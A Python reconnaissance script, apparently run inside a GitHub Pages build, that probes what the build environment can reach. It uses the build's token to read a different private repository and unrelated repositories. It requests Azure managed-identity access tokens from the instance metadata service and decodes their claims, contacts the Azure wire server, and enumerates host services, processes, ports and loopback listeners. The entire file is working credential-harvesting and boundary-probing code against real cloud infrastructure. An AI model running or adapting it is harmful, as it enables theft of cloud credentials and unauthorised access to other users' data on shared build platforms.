#!/usr/bin/env python3
"""U6 probe3: token reach + cloud metadata / internal-network reach."""
import base64
import json
import os
import socket
import subprocess
import urllib.error
import urllib.request

OUT = []
TOK = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN") or ""


def hdr(t):
    OUT.append("\n" + "=" * 70)
    OUT.append("### " + t)
    OUT.append("=" * 70)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def api(path, tok=TOK):
    req = urllib.request.Request("https://api.github.com" + path)
    if tok:
        req.add_header("Authorization", "token " + tok)
    req.add_header("Accept", "application/vnd.github+json")
    req.add_header("User-Agent", "u6-probe")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(600).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


def http(url, headers=None, timeout=15):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(2500).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1200).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


hdr("0. TOKEN PRESENT?")
OUT.append("GITHUB_TOKEN len=%d prefix=%s" % (len(TOK), TOK[:4]))

hdr("1. GITHUB_TOKEN SCOPE / CROSS-REPO REACH")
st, body = api("/rate_limit")
OUT.append("GET /rate_limit -> %s" % st)
try:
    d = json.loads(body)
    OUT.append("  core=%s graphql=%s search=%s" % (
        d["resources"]["core"]["limit"], d["resources"]["graphql"]["limit"],
        d["resources"]["search"]["limit"]))
except Exception:  # noqa: BLE001
    OUT.append(body[:300])

for repo in ("austindanson1/ghb-u6-pages", "austindanson1/codex-rainbow",
             "austindanson1/ghb-u6-private", "austindanson1/jane-street-dormant",
             "actions/checkout"):
    st, body = api("/repos/" + repo)
    try:
        d = json.loads(body)
        note = "private=%s" % d.get("private")
    except Exception:  # noqa: BLE001
        note = body[:100]
    OUT.append("  /repos/%-32s -> %s %s" % (repo, st, note))

hdr("1b. the OTHER PRIVATE repo: real file list via build token")
st, body = api("/repos/austindanson1/ghb-u6-private/contents/")
OUT.append("status=%s" % st)
try:
    for f in json.loads(body):
        OUT.append("   %-30s %7s bytes sha=%s" % (f["name"], f.get("size"), f.get("sha", "")[:12]))
except Exception:  # noqa: BLE001
    OUT.append(body[:300])

hdr("1c. read a repo the build was never granted (public, unrelated org)")
st, body = api("/repos/cli/cli/contents/")
OUT.append("cli/cli contents -> %s" % st)
try:
    OUT.append("  " + ", ".join(f["name"] for f in json.loads(body)[:10]))
except Exception:  # noqa: BLE001
    OUT.append(body[:200])

hdr("2. AZURE IMDS: what does the metadata service give the Pages build?")
for u in ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
          "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=json"):
    st, h, body = http(u, {"Metadata": "true"})
    OUT.append("\n%s -> %s" % (u, st))
    OUT.append(body[:2200])

hdr("2b. IMDS MANAGED IDENTITY TOKEN (a credential, if present)")
for res in ("https://management.azure.com/", "https://vault.azure.net",
            "https://storage.azure.com/"):
    u = ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
         "&resource=" + res)
    st, h, body = http(u, {"Metadata": "true"})
    OUT.append("\n%s -> %s" % (res, st))
    try:
        d = json.loads(body)
        tok = d.get("access_token", "")
        OUT.append("  token_type=%s expires_on=%s resource=%s" % (
            d.get("token_type"), d.get("expires_on"), d.get("resource")))
        OUT.append("  access_token len=%d prefix=%s" % (len(tok), tok[:40]))
        if tok:
            OUT.append("  claims: %s" % json.dumps(
                json.loads(base64.urlsafe_b64decode(
                    tok.split(".")[1] + "=" * (-len(tok.split(".")[1]) % 4))), indent=1)[:1200])
    except Exception:  # noqa: BLE001
        OUT.append("  " + body[:500])

hdr("2c. AZURE WIRE SERVER 168.63.129.16 (host<->guest channel)")
for u in ("http://168.63.129.16/?comp=versions",
          "http://168.63.129.16/machine?comp=versions"):
    st, h, body = http(u, {}, timeout=12)
    OUT.append("\n%s -> %s" % (u, st))
    OUT.append(body[:1200])

hdr("3. WHAT ELSE RUNS ON THIS BOX (hosted compute agent)")
OUT.append(sh("systemctl list-units --type=service --no-pager 2>/dev/null | head -30"))
OUT.append("\n$ ls -la /opt/hca\n" + sh("ls -la /opt/hca 2>&1"))
OUT.append("\n$ find /opt/hca -maxdepth 3 -type f | head -30\n" + sh("find /opt/hca -maxdepth 3 2>/dev/null | head -30"))
OUT.append("\n$ ps aux (github-owned processes)\n" + sh("ps aux | grep -v '^runner' | head -25"))
OUT.append("\n$ listening ports\n" + sh("ss -lntp 2>/dev/null | head -20"))
OUT.append("\n$ resolv.conf search domain\n" + sh("cat /etc/resolv.conf"))

hdr("3b. does anything listen on a loopback port that answers?")
for port in (8080, 3000, 5000, 8888, 9090, 12345):
    st, h, body = http("http://127.0.0.1:%d/" % port, {}, timeout=3)
    if st != "ERR":
        OUT.append("127.0.0.1:%d -> %s %s" % (port, st, body[:200]))

hdr("4. the repo's own Pages deployment API view")
st, body = api("/repos/austindanson1/ghb-u6-pages/pages")
OUT.append("GET /pages -> %s %s" % (st, body[:400]))
st, body = api("/repos/austindanson1/ghb-u6-pages/pages/builds?per_page=3")
OUT.append("GET /pages/builds -> %s %s" % (st, body[:800]))

text = "\n".join(OUT)
print(text)
with open(os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "probe-C.txt"), "w") as f:
    f.write(text)
